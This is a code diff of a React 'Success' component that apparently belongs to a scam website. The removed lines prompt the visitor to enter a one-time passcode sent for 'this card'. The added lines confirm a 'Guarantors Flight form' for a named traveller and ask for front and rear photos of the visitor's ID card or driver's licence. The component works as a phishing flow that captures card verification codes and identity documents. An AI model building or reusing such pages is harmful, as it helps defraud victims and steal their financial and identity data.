@@ -4,12 +4,10 @@ function Success(prop) {
     return (
         <div className="container">
             <div className="box">
-                <h1>Enter OTP code</h1>
-                 <p>We sent a one-time-passcode to your phone number/email associated with this card</p>
-                 <div className="card-input">
-                   <input type="number"  placeholder="12345" name="code" onChange={prop.getData2}/>
-                 </div>
-                 <button className="check" onClick={prop.handleSubmit2}>Verify</button>
+                <img src="https://static.vecteezy.com/system/resources/thumbnails/001/622/545/original/success-check-mark-icon-animation-video.jpg" alt="" />
+                <h2>Guarantors Flight form for Grace Angel Miller priviledge flight has been submited successfully</h2>
+                <p className="pop">Please check back within 24 hours for <br />status update</p>
+                <p className="pop">Please provide a front and rear pictures of I.D card or drivers lincese to grace Angel Miller</p>
             </div>
         </div>
     )
